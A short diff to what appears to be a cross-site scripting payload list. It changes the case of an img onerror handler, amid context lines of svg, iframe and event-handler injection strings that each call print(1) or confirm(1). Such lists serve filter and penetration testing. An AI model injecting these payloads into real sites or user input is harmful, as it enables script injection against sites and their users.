@@ -17,7 +17,7 @@
 "><svg onload=print(1)//
 "onmouseover=print(1)//
 "autofocus/onfocus=print(1)//
-<img src="1" onerror=confirm(1)></img>
+<img src="1" onError=confirm(1)></img>
 <iframe id=x onfocus=confirm(1)>
 <xss onfocus=confirm(1) autofocus tabindex=1>
 <iframe oncontentvisibilityautostatechange=confirm(1) style=display:block;content-visibility:auto>
